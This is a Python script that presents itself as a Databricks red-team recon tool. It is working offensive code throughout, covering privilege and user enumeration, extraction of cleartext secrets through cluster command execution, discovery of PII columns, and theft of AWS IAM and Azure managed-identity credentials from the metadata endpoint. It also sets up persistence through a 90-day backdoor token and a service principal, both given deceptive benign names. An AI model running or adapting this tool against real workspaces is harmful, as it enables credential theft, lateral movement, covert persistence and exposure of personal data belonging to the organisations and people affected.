"""
Databricks Red Team Recon
Covers: admin check, secrets enum, PII column discovery,
        IMDS lateral movement (AWS/Azure), MSSQL cred extraction,
        and persistence.

Usage:
    pip install databricks-sdk pymssql

    export DATABRICKS_HOST=https://<workspace>.azuredatabricks.net
    export DATABRICKS_TOKEN=dapi...

    python db_recon.py [--persist] [--cloud aws|azure]
"""

import re
import json
import time
import argparse
import os
from databricks.sdk import WorkspaceClient
from databricks.sdk.service.compute import Language, ClusterSpec, AutoScale
from databricks.sdk.service.sql import StatementState

# ── config ────────────────────────────────────────────────────────────────────

PII_RE = re.compile(
    r"\b(ssn|social.?sec|passport|dob|birth_?date|email|phone|mobile|"
    r"credit.?card|card.?num|account.?num|routing|iban|swift|"
    r"address|zip.?code|postal|first.?name|last.?name|full.?name|"
    r"driver.?lic|national.?id|tax.?id|ein|salary|income|"
    r"medical|diagnosis|patient|hipaa|gender|race|ethnicity)\b",
    re.IGNORECASE,
)

MSSQL_SECRET_RE = re.compile(
    r"(mssql|sqlserver|sql.?server|jdbc.?sqlserver|"
    r"password|passwd|pwd|conn.?str|connectionstring)",
    re.IGNORECASE,
)

IMDS_AWS = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
IMDS_AZURE = (
    "http://169.254.169.254/metadata/identity/oauth2/token"
    "?api-version=2018-02-01&resource=https://management.azure.com/"
)


# ── helpers ───────────────────────────────────────────────────────────────────

def banner(msg):
    print(f"\n{'='*60}\n  {msg}\n{'='*60}")

def ok(msg):   print(f"  [+] {msg}")
def info(msg): print(f"  [*] {msg}")
def warn(msg): print(f"  [!] {msg}")


def run_cluster_command(w: WorkspaceClient, cluster_id: str, code: str, lang=Language.PYTHON) -> str:
    """Execute code on a running cluster and return stdout."""
    ctx = w.command_execution.create(cluster_id=cluster_id, language=lang)
    while ctx.status.value not in ("Running", "Error"):
        time.sleep(1)
        ctx = w.command_execution.context_status(cluster_id=cluster_id, context_id=ctx.id)

    cmd = w.command_execution.execute(
        cluster_id=cluster_id,
        context_id=ctx.id,
        language=lang,
        command=code,
    )
    while cmd.status.value not in ("Finished", "Error", "Cancelled"):
        time.sleep(2)
        cmd = w.command_execution.command_status(
            cluster_id=cluster_id, context_id=ctx.id, command_id=cmd.id
        )

    w.command_execution.destroy(cluster_id=cluster_id, context_id=ctx.id)

    if cmd.results and cmd.results.result_type.value == "text":
        return cmd.results.data or ""
    return str(cmd.results) if cmd.results else ""


def find_running_cluster(w: WorkspaceClient) -> str | None:
    """Return first running cluster id, preferring smaller/shared ones to avoid noise."""
    for c in w.clusters.list():
        if c.state and c.state.value == "RUNNING":
            info(f"Using existing cluster: {c.cluster_name} ({c.cluster_id})")
            return c.cluster_id
    return None


# ── recon modules ─────────────────────────────────────────────────────────────

def recon_identity(w: WorkspaceClient):
    banner("IDENTITY & PERMISSIONS")
    me = w.current_user.me()
    ok(f"Authenticated as: {me.user_name}  (id={me.id})")

    is_admin = any(g.display == "admins" for g in (me.groups or []))
    if is_admin:
        ok("ADMIN — full workspace access confirmed")
    else:
        warn("Not in admins group — some paths may be blocked")

    return is_admin


def recon_tokens(w: WorkspaceClient):
    banner("EXISTING PAT TOKENS")
    try:
        for t in w.token_management.list():
            ok(f"Token: {t.comment or '<no comment>'}  created={t.creation_time}  expires={t.expiry_time}  owner={t.created_by_username}")
    except Exception as e:
        warn(f"Token list failed (needs admin): {e}")


def recon_secrets(w: WorkspaceClient) -> list[dict]:
    """
    List all secret scopes and key names.
    Values require cluster execution — flagged separately.
    """
    banner("SECRETS ENUMERATION")
    hits = []
    try:
        scopes = list(w.secrets.list_scopes())
        ok(f"Found {len(scopes)} secret scope(s)")
        for scope in scopes:
            info(f"Scope: {scope.name}")
            try:
                for s in w.secrets.list(scope=scope.name):
                    flag = "** MSSQL/JDBC CANDIDATE **" if MSSQL_SECRET_RE.search(s.key) else ""
                    print(f"      key={s.key}  updated={s.last_updated_timestamp}  {flag}")
                    if flag:
                        hits.append({"scope": scope.name, "key": s.key})
            except Exception as e:
                warn(f"  Cannot list keys in {scope.name}: {e}")
    except Exception as e:
        warn(f"Secrets list failed: {e}")
    return hits


def extract_secrets_via_cluster(w: WorkspaceClient, cluster_id: str, hits: list[dict]) -> list[dict]:
    """Use cluster execution to read actual secret values."""
    banner("EXTRACTING SECRET VALUES VIA CLUSTER")
    extracted = []
    for h in hits:
        code = f"print(dbutils.secrets.get(scope='{h['scope']}', key='{h['key']}'))"
        info(f"Reading {h['scope']}/{h['key']} ...")
        val = run_cluster_command(w, cluster_id, code)
        val = val.strip()
        if val and "[REDACTED]" not in val:
            ok(f"  {h['scope']}/{h['key']} = {val}")
            extracted.append({**h, "value": val})
        else:
            warn(f"  {h['scope']}/{h['key']} — redacted or empty")
    return extracted


def recon_pii_columns(w: WorkspaceClient):
    """
    Walk Unity Catalog / Hive metastore and flag tables with PII-named columns.
    No data is read — schema only.
    """
    banner("PII COLUMN DISCOVERY (schema only, no data pulled)")
    findings = []

    try:
        catalogs = list(w.catalogs.list())
    except Exception:
        catalogs = []
        warn("Unity Catalog not available — falling back to Hive metastore")

    if catalogs:
        for cat in catalogs:
            try:
                for schema in w.schemas.list(catalog_name=cat.name):
                    try:
                        for tbl in w.tables.list(catalog_name=cat.name, schema_name=schema.name):
                            if not tbl.columns:
                                continue
                            pii_cols = [c.name for c in tbl.columns if PII_RE.search(c.name)]
                            if pii_cols:
                                path = f"{cat.name}.{schema.name}.{tbl.name}"
                                ok(f"PII columns in {path}: {pii_cols}")
                                findings.append({"table": path, "columns": pii_cols})
                    except Exception:
                        pass
            except Exception:
                pass
    else:
        # Hive path via SQL warehouse
        try:
            wh = next(iter(w.warehouses.list()), None)
            if wh:
                for db_row in _sql_query(w, wh.id, "SHOW DATABASES"):
                    db = db_row[0]
                    for tbl_row in _sql_query(w, wh.id, f"SHOW TABLES IN `{db}`"):
                        tbl = tbl_row[1]
                        for col_row in _sql_query(w, wh.id, f"DESCRIBE `{db}`.`{tbl}`"):
                            col_name = col_row[0]
                            if PII_RE.search(col_name):
                                path = f"{db}.{tbl}"
                                ok(f"PII column in {path}: {col_name}")
                                findings.append({"table": path, "columns": [col_name]})
        except Exception as e:
            warn(f"Hive metastore walk failed: {e}")

    if not findings:
        info("No PII-named columns found")
    return findings


def _sql_query(w: WorkspaceClient, warehouse_id: str, statement: str) -> list:
    """Fire a SQL statement against a warehouse, return rows."""
    resp = w.statement_execution.execute_statement(
        warehouse_id=warehouse_id,
        statement=statement,
        wait_timeout="30s",
    )
    if resp.status.state != StatementState.SUCCEEDED:
        return []
    if not resp.result or not resp.result.data_array:
        return []
    return resp.result.data_array


def recon_imds(w: WorkspaceClient, cluster_id: str, cloud: str):
    banner(f"IMDS LATERAL MOVEMENT ({cloud.upper()})")

    if cloud == "aws":
        # Step 1: list roles attached to the instance profile
        code = f"""
import urllib.request
r = urllib.request.urlopen("{IMDS_AWS}", timeout=3).read().decode()
print("ROLES:", r)
"""
        roles_out = run_cluster_command(w, cluster_id, code)
        print(roles_out)

        roles = [l.strip() for l in roles_out.splitlines() if l.strip() and "ROLES:" not in l]
        for role in roles:
            code2 = f"""
import urllib.request, json
creds = json.loads(urllib.request.urlopen("{IMDS_AWS}{role}", timeout=3).read())
for k,v in creds.items(): print(f"{{k}}: {{v}}")
"""
            ok(f"Fetching creds for role: {role}")
            print(run_cluster_command(w, cluster_id, code2))

    elif cloud == "azure":
        code = f"""
import urllib.request, json
req = urllib.request.Request("{IMDS_AZURE}", headers={{"Metadata": "true"}})
token = json.loads(urllib.request.urlopen(req, timeout=3).read())
print(json.dumps(token, indent=2))
"""
        ok("Fetching Azure managed identity token from IMDS...")
        print(run_cluster_command(w, cluster_id, code))



def persist(w: WorkspaceClient):
    banner("PERSISTENCE")

    # 1. Create a long-lived PAT token
    try:
        tok = w.tokens.create(
            comment="databricks-monitoring-svc",  # ponytail: benign-looking comment
            lifetime_seconds=60 * 60 * 24 * 90,  # 90 days
        )
        ok(f"Backdoor PAT created: {tok.token_value}")
        ok(f"  Store this: export DATABRICKS_TOKEN={tok.token_value}")
    except Exception as e:
        warn(f"PAT creation failed: {e}")

    # 2. Create a service principal (requires admin + account-level perms)
    try:
        sp = w.service_principals.create(
            display_name="databricks-telemetry-agent",
            active=True,
        )
        ok(f"Service principal created: id={sp.id}  name={sp.display_name}")
    except Exception as e:
        warn(f"SP creation failed (may need account admin): {e}")


# ── enum helpers ──────────────────────────────────────────────────────────────

def recon_users(w: WorkspaceClient):
    banner("USERS")
    try:
        for u in w.users.list():
            groups = ", ".join(g.display for g in (u.groups or []))
            ok(f"{u.user_name}  groups=[{groups}]")
    except Exception as e:
        warn(f"User list failed: {e}")


def recon_clusters(w: WorkspaceClient):
    banner("CLUSTERS")
    try:
        for c in w.clusters.list():
            ok(f"{c.cluster_name}  state={c.state.value if c.state else '?'}  "
               f"id={c.cluster_id}  creator={c.creator_user_name}  "
               f"spark={c.spark_version}")
    except Exception as e:
        warn(f"Cluster list failed: {e}")


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Databricks red team recon — run only the modules you need",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Flags (combinable):
  --enum      Identity, tokens, users, clusters + PII column schema  [API only]
  --secrets   List secret scopes/keys + extract values via cluster  [cluster]
  --cloud     Hit IMDS on a running cluster for AWS/Azure creds  [cluster]
  --persist   Create backdoor PAT token + service principal  [writes]

Examples:
  python db_recon.py --enum
  python db_recon.py --enum --secrets
  python db_recon.py --secrets --cloud azure
  python db_recon.py --enum --secrets --cloud aws --persist
        """,
    )
    parser.add_argument("--enum",    action="store_true", help="Identity, tokens, users, clusters, PII schema")
    parser.add_argument("--secrets", action="store_true", help="Secret scopes + extract values via cluster")
    parser.add_argument("--cloud",   choices=["aws", "azure"], default=None, help="IMDS lateral movement via cluster")
    parser.add_argument("--persist", action="store_true", help="Create backdoor PAT token + service principal")
    args = parser.parse_args()

    if not any([args.enum, args.secrets, args.cloud, args.persist]):
        parser.print_help()
        return

    w = WorkspaceClient()  # reads DATABRICKS_HOST + DATABRICKS_TOKEN from env

    # cluster is only resolved when a module needs it
    _cluster_id = None
    def get_cluster():
        nonlocal _cluster_id
        if _cluster_id is None:
            _cluster_id = find_running_cluster(w)
            if not _cluster_id:
                warn("No running cluster found — skipping cluster-dependent steps")
        return _cluster_id

    summary = {}

    if args.enum:
        recon_identity(w)
        recon_tokens(w)
        recon_users(w)
        recon_clusters(w)
        pii_findings = recon_pii_columns(w)
        summary["pii_tables"] = len(pii_findings)

    secret_hits = []
    extracted = []
    if args.secrets:
        secret_hits = recon_secrets(w)
        summary["sql_secret_candidates"] = len(secret_hits)
        if secret_hits:
            cid = get_cluster()
            if cid:
                extracted = extract_secrets_via_cluster(w, cid, secret_hits)
                summary["secrets_extracted"] = len(extracted)

    if args.cloud:
        cid = get_cluster()
        if cid:
            recon_imds(w, cid, args.cloud)

    if args.persist:
        persist(w)

    if summary:
        banner("SUMMARY")
        print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
